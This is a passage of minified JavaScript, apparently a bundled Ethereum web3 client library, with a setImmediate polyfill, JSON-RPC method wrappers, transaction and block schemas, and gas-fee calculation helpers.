                return this._promise.catch(e)
            })
        }
        finally(e) {
            return Fm(this, void 0, void 0, function*() {
                return this._promise.finally(e)
            })
        }
        on(e, n) {
            return super.on(e, n),
            this
        }
        once(e, n) {
            return super.once(e, n),
            this
        }
    }
    Zw = Symbol.toStringTag;
    var Qm = {}, HA;
    function Ek() {
        return HA || (HA = 1,
        function(t, e) {
            if (t.setImmediate)
                return;
            var n = 1, s = {}, o = !1, l = t.document, u;
            function d(I) {
                typeof I != "function" && (I = new Function("" + I));
                for (var O = new Array(arguments.length - 1), z = 0; z < O.length; z++)
                    O[z] = arguments[z + 1];
                var L = {
                    callback: I,
                    args: O
                };
                return s[n] = L,
                u(n),
                n++
            }
            function p(I) {
                delete s[I]
            }
            function h(I) {
                var O = I.callback
                  , z = I.args;
                switch (z.length) {
                case 0:
                    O();
                    break;
                case 1:
                    O(z[0]);
                    break;
                case 2:
                    O(z[0], z[1]);
                    break;
                case 3:
                    O(z[0], z[1], z[2]);
                    break;
                default:
                    O.apply(e, z);
                    break
                }
            }
            function m(I) {
                if (o)
                    setTimeout(m, 0, I);
                else {
                    var O = s[I];
                    if (O) {
                        o = !0;
                        try {
                            h(O)
                        } finally {
                            p(I),
                            o = !1
                        }
                    }
                }
            }
            function y() {
                u = function(I) {
                    process.nextTick(function() {
                        m(I)
                    })
                }
            }
            function w() {
                if (t.postMessage && !t.importScripts) {
                    var I = !0
                      , O = t.onmessage;
                    return t.onmessage = function() {
                        I = !1
                    }
                    ,
                    t.postMessage("", "*"),
                    t.onmessage = O,
                    I
                }
            }
            function E() {
                var I = "setImmediate$" + Math.random() + "$"
                  , O = function(z) {
                    z.source === t && typeof z.data == "string" && z.data.indexOf(I) === 0 && m(+z.data.slice(I.length))
                };
                t.addEventListener ? t.addEventListener("message", O, !1) : t.attachEvent("onmessage", O),
                u = function(z) {
                    t.postMessage(I + z, "*")
                }
            }
            function S() {
                var I = new MessageChannel;
                I.port1.onmessage = function(O) {
                    var z = O.data;
                    m(z)
                }
                ,
                u = function(O) {
                    I.port2.postMessage(O)
                }
            }
            function _() {
                var I = l.documentElement;
                u = function(O) {
                    var z = l.createElement("script");
                    z.onreadystatechange = function() {
                        m(O),
                        z.onreadystatechange = null,
                        I.removeChild(z),
                        z = null
                    }
                    ,
                    I.appendChild(z)
                }
            }
            function x() {
                u = function(I) {
                    setTimeout(m, 0, I)
                }
            }
            var b = Object.getPrototypeOf && Object.getPrototypeOf(t);
            b = b && b.setTimeout ? b : t,
            {}.toString.call(t.process) === "[object process]" ? y() : w() ? E() : t.MessageChannel ? S() : l && "onreadystatechange"in l.createElement("script") ? _() : x(),
            b.setImmediate = d,
            b.clearImmediate = p
        }(typeof self > "u" ? typeof Da > "u" ? Qm : Da : self)),
        Qm
    }
    Ek();
    var Be = function(t, e, n, s) {
        function o(l) {
            return l instanceof n ? l : new n(function(u) {
                u(l)
            }
            )
        }
        return new (n || (n = Promise))(function(l, u) {
            function d(m) {
                try {
                    h(s.next(m))
                } catch (y) {
                    u(y)
                }
            }
            function p(m) {
                try {
                    h(s.throw(m))
                } catch (y) {
                    u(y)
                }
            }
            function h(m) {
                m.done ? l(m.value) : o(m.value).then(d, p)
            }
            h((s = s.apply(t, e || [])).next())
        }
        )
    };
    function xk(t) {
        return Be(this, void 0, void 0, function*() {
            return t.send({
                method: "eth_protocolVersion",
                params: []
            })
        })
    }
    function Xw(t) {
        return Be(this, void 0, void 0, function*() {
            return t.send({
                method: "eth_syncing",
                params: []
            })
        })
    }
    function Sk(t) {
        return Be(this, void 0, void 0, function*() {
            return t.send({
                method: "eth_coinbase",
                params: []
            })
        })
    }
    function Tk(t) {
        return Be(this, void 0, void 0, function*() {
            return t.send({
                method: "eth_mining",
                params: []
            })
        })
    }
    function Rk(t) {
        return Be(this, void 0, void 0, function*() {
            return t.send({
                method: "eth_hashrate",
                params: []
            })
        })
    }
    function Bk(t) {
        return Be(this, void 0, void 0, function*() {
            return t.send({
                method: "eth_gasPrice",
                params: []
            })
        })
    }
    function Ck(t) {
        return Be(this, void 0, void 0, function*() {
            return t.send({
                method: "eth_maxPriorityFeePerGas",
                params: []
            })
        })
    }
    function Ik(t) {
        return Be(this, void 0, void 0, function*() {
            return t.send({
                method: "eth_accounts",
                params: []
            })
        })
    }
    function kk(t) {
        return Be(this, void 0, void 0, function*() {
            return t.send({
                method: "eth_blockNumber",
                params: []
            })
        })
    }
    function Ok(t, e, n) {
        return Be(this, void 0, void 0, function*() {
            return Ae.validate(["address", "blockNumberOrTag"], [e, n]),
            t.send({
                method: "eth_getBalance",
                params: [e, n]
            })
        })
    }
    function Nk(t, e, n, s) {
        return Be(this, void 0, void 0, function*() {
            return Ae.validate(["address", "hex", "blockNumberOrTag"], [e, n, s]),
            t.send({
                method: "eth_getStorageAt",
                params: [e, n, s]
            })
        })
    }
    function Mk(t, e, n) {
        return Be(this, void 0, void 0, function*() {
            return Ae.validate(["address", "blockNumberOrTag"], [e, n]),
            t.send({
                method: "eth_getTransactionCount",
                params: [e, n]
            })
        })
    }
    function Dk(t, e) {
        return Be(this, void 0, void 0, function*() {
            return Ae.validate(["bytes32"], [e]),
            t.send({
                method: "eth_getBlockTransactionCountByHash",
                params: [e]
            })
        })
    }
    function Lk(t, e) {
        return Be(this, void 0, void 0, function*() {
            return Ae.validate(["blockNumberOrTag"], [e]),
            t.send({
                method: "eth_getBlockTransactionCountByNumber",
                params: [e]
            })
        })
    }
    function Uk(t, e) {
        return Be(this, void 0, void 0, function*() {
            return Ae.validate(["bytes32"], [e]),
            t.send({
                method: "eth_getUncleCountByBlockHash",
                params: [e]
            })
        })
    }
    function jk(t, e) {
        return Be(this, void 0, void 0, function*() {
            return Ae.validate(["blockNumberOrTag"], [e]),
            t.send({
                method: "eth_getUncleCountByBlockNumber",
                params: [e]
            })
        })
    }
    function Pk(t, e, n) {
        return Be(this, void 0, void 0, function*() {
            return Ae.validate(["address", "blockNumberOrTag"], [e, n]),
            t.send({
                method: "eth_getCode",
                params: [e, n]
            })
        })
    }
    function Hk(t, e, n) {
        return Be(this, void 0, void 0, function*() {
            return Ae.validate(["address", "hex"], [e, n]),
            t.send({
                method: "eth_sign",
                params: [e, n]
            })
        })
    }
    function zk(t, e) {
        return Be(this, void 0, void 0, function*() {
            return t.send({
                method: "eth_signTransaction",
                params: [e]
            })
        })
    }
    function Gk(t, e) {
        return Be(this, void 0, void 0, function*() {
            return t.send({
                method: "eth_sendTransaction",
                params: [e]
            })
        })
    }
    function Jw(t, e) {
        return Be(this, void 0, void 0, function*() {
            return Ae.validate(["hex"], [e]),
            t.send({
                method: "eth_sendRawTransaction",
                params: [e]
            })
        })
    }
    function qk(t, e, n) {
        return Be(this, void 0, void 0, function*() {
            return Ae.validate(["blockNumberOrTag"], [n]),
            t.send({
                method: "eth_call",
                params: [e, n]
            })
        })
    }
    function Fk(t, e, n) {
        return Be(this, void 0, void 0, function*() {
            return Ae.validate(["blockNumberOrTag"], [n]),
            t.send({
                method: "eth_estimateGas",
                params: [e, n]
            })
        })
    }
    function Qk(t, e, n) {
        return Be(this, void 0, void 0, function*() {
            return Ae.validate(["bytes32", "bool"], [e, n]),
            t.send({
                method: "eth_getBlockByHash",
                params: [e, n]
            })
        })
    }
    function $w(t, e, n) {
        return Be(this, void 0, void 0, function*() {
            return Ae.validate(["blockNumberOrTag", "bool"], [e, n]),
            t.send({
                method: "eth_getBlockByNumber",
                params: [e, n]
            })
        })
    }
    function Vk(t, e) {
        return Be(this, void 0, void 0, function*() {
            return Ae.validate(["bytes32"], [e]),
            t.send({
                method: "eth_getTransactionByHash",
                params: [e]
            })
        })
    }
    function Yk(t, e, n) {
        return Be(this, void 0, void 0, function*() {
            return Ae.validate(["bytes32", "hex"], [e, n]),
            t.send({
                method: "eth_getTransactionByBlockHashAndIndex",
                params: [e, n]
            })
        })
    }
    function Zk(t, e, n) {
        return Be(this, void 0, void 0, function*() {
            return Ae.validate(["blockNumberOrTag", "hex"], [e, n]),
            t.send({
                method: "eth_getTransactionByBlockNumberAndIndex",
                params: [e, n]
            })
        })
    }
    function Kk(t, e) {
        return Be(this, void 0, void 0, function*() {
            return Ae.validate(["bytes32"], [e]),
            t.send({
                method: "eth_getTransactionReceipt",
                params: [e]
            })
        })
    }
    function Xk(t, e, n) {
        return Be(this, void 0, void 0, function*() {
            return Ae.validate(["bytes32", "hex"], [e, n]),
            t.send({
                method: "eth_getUncleByBlockHashAndIndex",
                params: [e, n]
            })
        })
    }
    function Jk(t, e, n) {
        return Be(this, void 0, void 0, function*() {
            return Ae.validate(["blockNumberOrTag", "hex"], [e, n]),
            t.send({
                method: "eth_getUncleByBlockNumberAndIndex",
                params: [e, n]
            })
        })
    }
    function $k(t, e) {
        return Be(this, void 0, void 0, function*() {
            return Ae.validate(["filter"], [e]),
            t.send({
                method: "eth_newFilter",
                params: [e]
            })
        })
    }
    function Wk(t) {
        return Be(this, void 0, void 0, function*() {
            return t.send({
                method: "eth_newBlockFilter",
                params: []
            })
        })
    }
    function eO(t) {
        return Be(this, void 0, void 0, function*() {
            return t.send({
                method: "eth_newPendingTransactionFilter",
                params: []
            })
        })
    }
    function tO(t, e) {
        return Be(this, void 0, void 0, function*() {
            return Ae.validate(["hex"], [e]),
            t.send({
                method: "eth_uninstallFilter",
                params: [e]
            })
        })
    }
    function nO(t, e) {
        return Be(this, void 0, void 0, function*() {
            return Ae.validate(["hex"], [e]),
            t.send({
                method: "eth_getFilterChanges",
                params: [e]
            })
        })
    }
    function iO(t, e) {
        return Be(this, void 0, void 0, function*() {
            return Ae.validate(["hex"], [e]),
            t.send({
                method: "eth_getFilterLogs",
                params: [e]
            })
        })
    }
    function rO(t, e) {
        return Be(this, void 0, void 0, function*() {
            return Ae.validate(["filter"], [e]),
            t.send({
                method: "eth_getLogs",
                params: [e]
            })
        })
    }
    function sO(t) {
        return Be(this, void 0, void 0, function*() {
            return t.send({
                method: "eth_getWork",
                params: []
            })
        })
    }
    function aO(t, e, n, s) {
        return Be(this, void 0, void 0, function*() {
            return Ae.validate(["bytes8", "bytes32", "bytes32"], [e, n, s]),
            t.send({
                method: "eth_submitWork",
                params: [e, n, s]
            })
        })
    }
    function oO(t, e, n, s) {
        return Be(this, void 0, void 0, function*() {
            Ae.validate(["hex", "blockNumberOrTag"], [e, n]);
            for (const o of s)
                Ae.validate(["number"], [o]);
            return t.send({
                method: "eth_feeHistory",
                params: [e, n, s]
            })
        })
    }
    function lO(t) {
        return Be(this, void 0, void 0, function*() {
            return t.send({
                method: "eth_pendingTransactions",
                params: []
            })
        })
    }
    function cO(t) {
        return Be(this, void 0, void 0, function*() {
            return t.send({
                method: "eth_requestAccounts",
                params: []
            })
        })
    }
    function uO(t) {
        return Be(this, void 0, void 0, function*() {
            return t.send({
                method: "eth_chainId",
                params: []
            })
        })
    }
    function dO(t, e, n, s) {
        return Be(this, void 0, void 0, function*() {
            return Ae.validate(["address", "bytes32[]", "blockNumberOrTag"], [e, n, s]),
            t.send({
                method: "eth_getProof",
                params: [e, n, s]
            })
        })
    }
    function fO(t) {
        return Be(this, void 0, void 0, function*() {
            return t.send({
                method: "web3_clientVersion",
                params: []
            })
        })
    }
    function hO(t, e, n) {
        return Be(this, void 0, void 0, function*() {
            return Ae.validate(["blockNumberOrTag"], [n]),
            t.send({
                method: "eth_createAccessList",
                params: [e, n]
            })
        })
    }
    function mO(t, e, n, s=!1) {
        return Be(this, void 0, void 0, function*() {
            return Ae.validate(["address"], [e]),
            t.send({
                method: `eth_signTypedData${s ? "" : "_v4"}`,
                params: [e, n]
            })
        })
    }
    var E0 = function(t, e, n, s) {
        function o(l) {
            return l instanceof n ? l : new n(function(u) {
                u(l)
            }
            )
        }
        return new (n || (n = Promise))(function(l, u) {
            function d(m) {
                try {
                    h(s.next(m))
                } catch (y) {
                    u(y)
                }
            }
            function p(m) {
                try {
                    h(s.throw(m))
                } catch (y) {
                    u(y)
                }
            }
            function h(m) {
                m.done ? l(m.value) : o(m.value).then(d, p)
            }
            h((s = s.apply(t, e || [])).next())
        }
        )
    };
    function pO(t) {
        return E0(this, void 0, void 0, function*() {
            return t.send({
                method: "net_version",
                params: []
            })
        })
    }
    function gO(t) {
        return E0(this, void 0, void 0, function*() {
            return t.send({
                method: "net_peerCount",
                params: []
            })
        })
    }
    function yO(t) {
        return E0(this, void 0, void 0, function*() {
            return t.send({
                method: "net_listening",
                params: []
            })
        })
    }
    var or = function(t, e, n, s) {
        function o(l) {
            return l instanceof n ? l : new n(function(u) {
                u(l)
            }
            )
        }
        return new (n || (n = Promise))(function(l, u) {
            function d(m) {
                try {
                    h(s.next(m))
                } catch (y) {
                    u(y)
                }
            }
            function p(m) {
                try {
                    h(s.throw(m))
                } catch (y) {
                    u(y)
                }
            }
            function h(m) {
                m.done ? l(m.value) : o(m.value).then(d, p)
            }
            h((s = s.apply(t, e || [])).next())
        }
        )
    };
    const vO = t => or(void 0, void 0, void 0, function*() {
        return t.send({
            method: "personal_listAccounts",
            params: []
        })
    })
      , bO = (t, e) => or(void 0, void 0, void 0, function*() {
        return t.send({
            method: "personal_newAccount",
            params: [e]
        })
    })
      , AO = (t, e, n, s) => or(void 0, void 0, void 0, function*() {
        return t.send({
            method: "personal_unlockAccount",
            params: [e, n, s]
        })
    })
      , wO = (t, e) => or(void 0, void 0, void 0, function*() {
        return t.send({
            method: "personal_lockAccount",
            params: [e]
        })
    })
      , _O = (t, e, n) => or(void 0, void 0, void 0, function*() {
        return t.send({
            method: "personal_importRawKey",
            params: [e, n]
        })
    })
      , EO = (t, e, n) => or(void 0, void 0, void 0, function*() {
        return t.send({
            method: "personal_sendTransaction",
            params: [e, n]
        })
    })
      , xO = (t, e, n) => or(void 0, void 0, void 0, function*() {
        return t.send({
            method: "personal_signTransaction",
            params: [e, n]
        })
    })
      , SO = (t, e, n, s) => or(void 0, void 0, void 0, function*() {
        return t.send({
            method: "personal_sign",
            params: [e, n, s]
        })
    })
      , TO = (t, e, n) => or(void 0, void 0, void 0, function*() {
        return t.send({
            method: "personal_ecRecover",
            params: [e, n]
        })
    })
      , zA = {
        type: "object",
        properties: {
            accessList: {
                type: "null"
            },
            maxFeePerGas: {
                type: "null"
            },
            maxPriorityFeePerGas: {
                type: "null"
            }
        }
    }
      , GA = {
        type: "object",
        properties: {
            maxFeePerGas: {
                type: "null"
            },
            maxPriorityFeePerGas: {
                type: "null"
            }
        }
    }
      , qA = {
        type: "object",
        properties: {
            gasPrice: {
                type: "null"
            }
        }
    }
      , Tu = (t, e, n) => {
        try {
            Ae.validateJSONSchema(t, e)
        } catch (s) {
            throw s instanceof Ya ? new _R(s.errors,n) : s
        }
    }
      , RO = t => {
        var e, n;
        const s = t;
        if (!q(s.type)) {
            let l;
            switch (s.type) {
            case "0x0":
                l = zA;
                break;
            case "0x1":
                l = GA;
                break;
            case "0x2":
                l = qA;
                break;
            default:
                return ee({
                    format: "uint"
                }, s.type, Ce)
            }
            return Tu(l, s, s.type),
            ee({
                format: "uint"
            }, s.type, Ce)
        }
        if (!q(s.maxFeePerGas) || !q(s.maxPriorityFeePerGas))
            return Tu(qA, s, "0x2"),
            "0x2";
        if (!q(s.accessList))
            return Tu(GA, s, "0x1"),
            "0x1";
        const o = (e = s.hardfork) !== null && e !== void 0 ? e : (n = s.common) === null || n === void 0 ? void 0 : n.hardfork;
        if (!q(o)) {
            const l = Object.keys(xl).indexOf(o);
            if (l >= Object.keys(xl).indexOf("london"))
                return q(s.gasPrice) ? "0x2" : "0x0";
            if (l === Object.keys(xl).indexOf("berlin"))
                return "0x0"
        }
        if (!q(s.gasPrice))
            return Tu(zA, s, "0x0"),
            "0x0"
    }
      , BO = (t, e) => {
        var n;
        return ((n = e?.transactionTypeParser) !== null && n !== void 0 ? n : RO)(t)
    }
      , CO = t => t[0] > 127 ? "0x0" : ir(t[0])
      , IO = {
        type: "object",
        properties: {
            address: {
                format: "address"
            },
            storageKeys: {
                type: "array",
                items: {
                    format: "bytes32"
                }
            }
        }
    }
      , x0 = {
        type: "array",
        items: Object.assign({}, IO)
    }
      , kO = {
        type: "object",
        properties: {
            accessList: Object.assign({}, x0),
            gasUsed: {
                type: "string"
            }
        }
    }
      , FA = {
        type: "string",
        enum: ["goerli", "kovan", "mainnet", "rinkeby", "ropsten", "sepolia"]
    }
      , QA = {
        type: "string",
        enum: ["arrowGlacier", "berlin", "byzantium", "chainstart", "constantinople", "dao", "homestead", "istanbul", "london", "merge", "muirGlacier", "petersburg", "shanghai", "spuriousDragon", "tangerineWhistle"]
    }
      , OO = {
        type: "object",
        properties: {
            name: {
                format: "string"
            },
            networkId: {
                format: "uint"
            },
            chainId: {
                format: "uint"
            }
        }
    }
      , Ww = {
        type: "object",
        properties: {
            from: {
                format: "address"
            },
            to: {
                oneOf: [{
                    format: "address"
                }, {
                    type: "null"
                }]
            },
            value: {
                format: "uint"
            },
            gas: {
                format: "uint"
            },
            gasPrice: {
                format: "uint"
            },
            effectiveGasPrice: {
                format: "uint"
            },
            type: {
                format: "uint"
            },
            maxFeePerGas: {
                format: "uint"
            },
            maxPriorityFeePerGas: {
                format: "uint"
            },
            accessList: Object.assign({}, x0),
            data: {
                format: "bytes"
            },
            input: {
                format: "bytes"
            },
            nonce: {
                format: "uint"
            },
            chain: Object.assign({}, FA),
            hardfork: Object.assign({}, QA),
            chainId: {
                format: "uint"
            },
            networkId: {
                format: "uint"
            },
            common: {
                type: "object",
                properties: {
                    customChain: Object.assign({}, OO),
                    baseChain: Object.assign({}, FA),
                    hardfork: Object.assign({}, QA)
                }
            },
            gasLimit: {
                format: "uint"
            },
            v: {
                format: "uint"
            },
            r: {
                format: "bytes32"
            },
            s: {
                format: "bytes32"
            }
        }
    }
      , vp = {
        type: "object",
        properties: Object.assign(Object.assign({}, Ww.properties), {
            blockHash: {
                format: "bytes32"
            },
            blockNumber: {
                format: "uint"
            },
            hash: {
                format: "bytes32"
            },
            transactionIndex: {
                format: "uint"
            },
            from: {
                format: "address"
            },
            to: {
                oneOf: [{
                    format: "address"
                }, {
                    type: "null"
                }]
            },
            value: {
                format: "uint"
            },
            gas: {
                format: "uint"
            },
            gasPrice: {
                format: "uint"
            },
            effectiveGasPrice: {
                format: "uint"
            },
            type: {
                format: "uint"
            },
            maxFeePerGas: {
                format: "uint"
            },
            maxPriorityFeePerGas: {
                format: "uint"
            },
            accessList: Object.assign({}, x0),
            data: {
                format: "bytes"
            },
            input: {
                format: "bytes"
            },
            nonce: {
                format: "uint"
            },
            gasLimit: {
                format: "uint"
            },
            v: {
                format: "uint"
            },
            r: {
                format: "bytes32"
            },
            s: {
                format: "bytes32"
            }
        })
    }
      , e_ = {
        type: "object",
        properties: {
            index: {
                format: "uint"
            },
            validatorIndex: {
                format: "uint"
            },
            address: {
                format: "address"
            },
            amount: {
                format: "uint"
            }
        }
    }
      , wd = {
        type: "object",
        properties: {
            baseFeePerGas: {
                format: "uint"
            },
            blobGasUsed: {
                format: "uint"
            },
            difficulty: {
                format: "uint"
            },
            excessBlobGas: {
                format: "uint"
            },
            extraData: {
                format: "bytes"
            },
            gasLimit: {
                format: "uint"
            },
            gasUsed: {
                format: "uint"
            },
            hash: {
                format: "bytes32"
            },
            logsBloom: {
                format: "bytes256"
            },
            miner: {
                format: "bytes"
            },
            mixHash: {
                format: "bytes32"
            },
            nonce: {
                format: "uint"
            },
            number: {
                format: "uint"
            },
            parentBeaconBlockRoot: {
                format: "bytes32"
            },
            parentHash: {
                format: "bytes32"
            },
            receiptsRoot: {
                format: "bytes32"
            },
            sha3Uncles: {
                format: "bytes32"
            },
            size: {
                format: "uint"
            },
            stateRoot: {
                format: "bytes32"
            },
            timestamp: {
                format: "uint"
            },
            totalDifficulty: {
                format: "uint"
            },
            transactions: {
                oneOf: [{
                    type: "array",
                    items: Object.assign({}, vp)
                }, {
                    type: "array",
                    items: {
                        format: "bytes32"
                    }
                }]
            },
            transactionsRoot: {
                format: "bytes32"
            },
            uncles: {
                type: "array",
                items: {
                    format: "bytes32"
                }
            },
            withdrawals: {
                type: "array",
                items: Object.assign({}, e_)
            },
            withdrawalsRoot: {
                format: "bytes32"
            }
        }
    }
      , NO = {
        type: "object",
        properties: {
            author: {
                format: "bytes32"
            },
            excessDataGas: {
                format: "uint"
            },
            baseFeePerGas: {
                format: "uint"
            },
            blobGasUsed: {
                format: "uint"
            },
            difficulty: {
                format: "uint"
            },
            excessBlobGas: {
                format: "uint"
            },
            extraData: {
                format: "bytes"
            },
            gasLimit: {
                format: "uint"
            },
            gasUsed: {
                format: "uint"
            },
            hash: {
                format: "bytes32"
            },
            logsBloom: {
                format: "bytes256"
            },
            miner: {
                format: "bytes"
            },
            mixHash: {
                format: "bytes32"
            },
            nonce: {
                format: "uint"
            },
            number: {
                format: "uint"
            },
            parentBeaconBlockRoot: {
                format: "bytes32"
            },
            parentHash: {
                format: "bytes32"
            },
            receiptsRoot: {
                format: "bytes32"
            },
            sha3Uncles: {
                format: "bytes32"
            },
            size: {
                format: "uint"
            },
            stateRoot: {
                format: "bytes32"
            },
            timestamp: {
                format: "uint"
            },
            totalDifficulty: {
                format: "uint"
            },
            transactions: {
                type: "array",
                items: {
                    format: "bytes32"
                }
            },
            transactionsRoot: {
                format: "bytes32"
            },
            uncles: {
                type: "array",
                items: {
                    format: "bytes32"
                }
            },
            withdrawals: {
                type: "array",
                items: Object.assign({}, e_)
            },
            withdrawalsRoot: {
                format: "bytes32"
            }
        }
    }
      , co = {
        type: "object",
        properties: {
            removed: {
                format: "bool"
            },
            logIndex: {
                format: "uint"
            },
            transactionIndex: {
                format: "uint"
            },
            transactionHash: {
                format: "bytes32"
            },
            blockHash: {
                format: "bytes32"
            },
            blockNumber: {
                format: "uint"
            },
            address: {
                format: "address"
            },
            data: {
                format: "bytes"
            },
            topics: {
                type: "array",
                items: {
                    format: "bytes32"
                }
            }
        }
    }
      , MO = {
        type: "object",
        properties: {
            startingBlock: {
                format: "string"
            },
            currentBlock: {
                format: "string"
            },
            highestBlock: {
                format: "string"
            },
            knownStates: {
                format: "string"
            },
            pulledStates: {
                format: "string"
            }
        }
    }
      , uo = {
        type: "object",
        properties: {
            transactionHash: {
                format: "bytes32"
            },
            transactionIndex: {
                format: "uint"
            },
            blockHash: {
                format: "bytes32"
            },
            blockNumber: {
                format: "uint"
            },
            from: {
                format: "address"
            },
            to: {
                format: "address"
            },
            cumulativeGasUsed: {
                format: "uint"
            },
            gasUsed: {
                format: "uint"
            },
            effectiveGasPrice: {
                format: "uint"
            },
            contractAddress: {
                format: "address"
            },
            logs: {
                type: "array",
                items: Object.assign({}, co)
            },
            logsBloom: {
                format: "bytes"
            },
            root: {
                format: "bytes"
            },
            status: {
                format: "uint"
            },
            type: {
                format: "uint"
            }
        }
    }
      , DO = {
        type: "object",
        properties: {
            messageHash: {
                format: "bytes"
            },
            r: {
                format: "bytes32"
            },
            s: {
                format: "bytes32"
            },
            v: {
                format: "bytes"
            },
            message: {
                format: "bytes"
            },
            signature: {
                format: "bytes"
            }
        }
    }
      , LO = {
        type: "object",
        properties: {
            oldestBlock: {
                format: "uint"
            },
            baseFeePerGas: {
                type: "array",
                items: {
                    format: "uint"
                }
            },
            reward: {
                type: "array",
                items: {
                    type: "array",
                    items: {
                        format: "uint"
                    }
                }
            },
            gasUsedRatio: {
                type: "array",
                items: {
                    type: "number"
                }
            }
        }
    }
      , UO = {
        type: "object",
        properties: {
            key: {
                format: "bytes32"
            },
            value: {
                format: "uint"
            },
            proof: {
                type: "array",
                items: {
                    format: "bytes32"
                }
            }
        }
    }
      , jO = {
        type: "object",
        properties: {
            balance: {
                format: "uint"
            },
            codeHash: {
                format: "bytes32"
            },
            nonce: {
                format: "uint"
            },
            storageHash: {
                format: "bytes32"
            },
            accountProof: {
                type: "array",
                items: {
                    format: "bytes32"
                }
            },
            storageProof: {
                type: "array",
                items: Object.assign({}, UO)
            }
        }
    };
    function pn(t, e=$t, n={
        transactionSchema: vp,
        fillInputAndData: !1
    }) {
        var s, o;
        let l = Vr({}, t);
        if (q(t?.common) || (l.common = Object.assign({}, t.common),
        q((s = t.common) === null || s === void 0 ? void 0 : s.customChain) || (l.common.customChain = Object.assign({}, t.common.customChain))),
        l = ee((o = n.transactionSchema) !== null && o !== void 0 ? o : vp, l, e),
        !q(l.data) && !q(l.input) && ir(l.data) !== ir(l.input))
            throw new b1({
                data: je(l.data),
                input: je(l.input)
            });
        return n.fillInputAndData && (q(l.data) ? q(l.input) || (l.data = l.input) : l.input = l.data),
        q(l.gasLimit) || (l.gas = l.gasLimit,
        delete l.gasLimit),
        l
    }
    function PO(t, e, n={
        fillInputAndData: !1
    }) {
        return {
            raw: ee({
                format: "bytes"
            }, t, e),
            tx: pn(Object.assign(Object.assign({}, Ds.fromSerializedData(lt(t)).toJSON()), {
                hash: je(Xa(lt(t))),
                type: CO(lt(t))
            }), e, {
                fillInputAndData: n.fillInputAndData,
                transactionSchema: n.transactionSchema
            })
        }
    }
    var S0 = function(t, e, n, s) {
        function o(l) {
            return l instanceof n ? l : new n(function(u) {
                u(l)
            }
            )
        }
        return new (n || (n = Promise))(function(l, u) {
            function d(m) {
                try {
                    h(s.next(m))
                } catch (y) {
                    u(y)
                }
            }
            function p(m) {
                try {
                    h(s.throw(m))
                } catch (y) {
                    u(y)
                }
            }
            function h(m) {
                m.done ? l(m.value) : o(m.value).then(d, p)
            }
            h((s = s.apply(t, e || [])).next())
        }
        )
    };
    function T0(t, e) {
        return S0(this, void 0, void 0, function*() {
            const n = yield pO(t.requestManager);
            return ee({
                format: "uint"
            }, n, e)
        })
    }
    function HO(t, e) {
        return S0(this, void 0, void 0, function*() {
            const n = yield gO(t.requestManager);
            return ee({
                format: "uint"
            }, n, e)
        })
    }
    const zO = t => S0(void 0, void 0, void 0, function*() {
        return yO(t.requestManager)
    });
    var Vm = function(t, e, n, s) {
        function o(l) {
            return l instanceof n ? l : new n(function(u) {
                u(l)
            }
            )
        }
        return new (n || (n = Promise))(function(l, u) {
            function d(m) {
                try {
                    h(s.next(m))
                } catch (y) {
                    u(y)
                }
            }
            function p(m) {
                try {
                    h(s.throw(m))
                } catch (y) {
                    u(y)
                }
            }
            function h(m) {
                m.done ? l(m.value) : o(m.value).then(d, p)
            }
            h((s = s.apply(t, e || [])).next())
        }
        )
    };
    class t_ extends mn {
        getId(e=this.defaultReturnFormat) {
            return Vm(this, void 0, void 0, function*() {
                return T0(this, e)
            })
        }
        getPeerCount(e=this.defaultReturnFormat) {
            return Vm(this, void 0, void 0, function*() {
                return HO(this, e)
            })
        }
        isListening() {
            return Vm(this, void 0, void 0, function*() {
                return zO(this)
            })
        }
    }
    const no = "ALLEVENTS"
      , bp = {
        name: no,
        signature: "",
        type: "event",
        inputs: []
    }
      , ef = {
        bytes: er.HEX,
        number: Qn.NUMBER
    };
    var n_ = function(t, e, n, s) {
        function o(l) {
            return l instanceof n ? l : new n(function(u) {
                u(l)
            }
            )
        }
        return new (n || (n = Promise))(function(l, u) {
            function d(m) {
                try {
                    h(s.next(m))
                } catch (y) {
                    u(y)
                }
            }
            function p(m) {
                try {
                    h(s.throw(m))
                } catch (y) {
                    u(y)
                }
            }
            function h(m) {
                m.done ? l(m.value) : o(m.value).then(d, p)
            }
            h((s = s.apply(t, e || [])).next())
        }
        )
    };
    function GO(t, e, n) {
        return n_(this, void 0, void 0, function*() {
            var s, o, l, u;
            const d = yield k_(e, e.defaultBlock, !1, Ce);
            if (q(d.baseFeePerGas))
                throw new vR;
            let p;
            if (q(t.gasPrice) && BigInt(d.baseFeePerGas) === BigInt(0) && (p = yield D0(e, n)),
            !q(t.gasPrice) || !q(p)) {
                const h = ee({
                    format: "uint"
                }, (s = t.gasPrice) !== null && s !== void 0 ? s : p, n);
                return {
                    maxPriorityFeePerGas: h,
                    maxFeePerGas: h
                }
            }
            return {
                maxPriorityFeePerGas: ee({
                    format: "uint"
                }, (o = t.maxPriorityFeePerGas) !== null && o !== void 0 ? o : e.defaultMaxPriorityFeePerGas, n),
                maxFeePerGas: ee({
                    format: "uint"
                }, (l = t.maxFeePerGas) !== null && l !== void 0 ? l : BigInt(d.baseFeePerGas) * BigInt(2) + BigInt((u = t.maxPriorityFeePerGas) !== null && u !== void 0 ? u : e.defaultMaxPriorityFeePerGas), n)
            }
        })
    }
    function i_(t, e, n) {
        return n_(this, void 0, void 0, function*() {
            const s = r_(t, e);
            if (!q(s)) {
                if (s.startsWith("-"))
                    throw new eA(s);
                if (Number(s) < 0 || Number(s) > 127)
                    throw new eA(s);
                if (q(t.gasPrice) && (s === "0x0" || s === "0x1"))
                    return {
                        gasPrice: yield D0(e, n),
                        maxPriorityFeePerGas: void 0,
                        maxFeePerGas: void 0
                    };
                if (s === "0x2")
                    return Object.assign({
                        gasPrice: void 0
                    }, yield GO(t, e, n))
            }
        })
    }
    var R0 = function(t, e, n, s) {
        function o(l) {
            return l instanceof n ? l : new n(function(u) {
                u(l)
            }
            )
        }
        return new (n || (n = Promise))(function(l, u) {
            function d(m) {
                try {
                    h(s.next(m))
                } catch (y) {
                    u(y)
                }
            }
            function p(m) {
                try {
                    h(s.throw(m))
                } catch (y) {
                    u(y)
                }
            }
            function h(m) {
                m.done ? l(m.value) : o(m.value).then(d, p)
            }
            h((s = s.apply(t, e || [])).next())
        }
        )
    };
    const Ap = (t, e, n, s) => {
        if (n !== void 0 && t in n && n[t] !== void 0) {
            if (typeof n[t] == "string" && Sn(n[t]))
                return n[t];
            if (!Ke(n[t]) && $1(n[t])) {
                if (e.wallet) {
                    const o = e.wallet.get(ee({
                        format: "uint"
                    }, n[t], ef));
                    if (!q(o))
                        return o.address;
                    throw new tA
                }
                throw new tA
            } else
